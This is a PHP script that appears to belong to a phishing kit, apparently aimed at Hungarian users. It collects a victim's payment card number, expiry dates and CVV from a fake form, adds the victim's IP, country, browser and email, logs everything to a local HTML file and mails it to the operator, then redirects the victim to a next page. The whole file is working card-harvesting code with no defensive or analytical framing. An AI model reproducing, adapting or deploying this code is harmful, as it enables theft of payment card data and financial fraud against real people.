<?php
error_reporting(0);
session_start();
include("./config/madara.php");
include("./config/obito.php");
        $_SESSION['cntcode'] = $countrycode;
        $_SESSION['cntname'] = $countryname;
        $ip = $_SERVER["REMOTE_ADDR"];
        $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
	 $subject  = " Nav cc  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
    $headers  = "MIME-Version: 1.0" . "\r\n";
	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$headers .= "From: noreply@madara.hu" . "\r\n";
	$message = "
<body style='background: black;'>			
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
<font color='#9c27b0'>____________________________________________________________________<br><br>
<font color='white'>IP         =>   <font color='#7fff00'>".$_SESSION['_IP_']."</font><br />
<font color='white'>TIME       =>   <font color='#7fff00'>".$time."</font><br />
<font color='white'>BROWSER    =>   <font color='#7fff00'>".$browser."</font><br />
<font color='white'>AGENT      =>   <font color='#7fff00'>".$user_agent."</font><br />
<font color='#9c27b0'>____________________________________________________________________<br><br>
<font color='white'>Name         : <font color='#ff1493'>".$_SESSION['Eamil']."</font><br />
<font color='white'>C1r3         : <font color='#ff1493'>".$_POST['p']."</font><br />
<font color='white'>D1te         : <font color='#ff1493'>".$_POST['exp1']."</font><br />
<font color='white'>D2te         : <font color='#ff1493'>".$_POST['exp2']."</font><br />
<font color='white'>Nav          : <font color='#ff1493'>".$_POST['ccv']."</font><br />
<font color='#9c27b0'>___________________________________________________________________";
$fp = fopen('kira.html', 'a');
fwrite($fp, $message);
fclose($fp);


	@mail($to,$subject,$message,$headers);
header("Location: ./adovisszaterite.php");
?>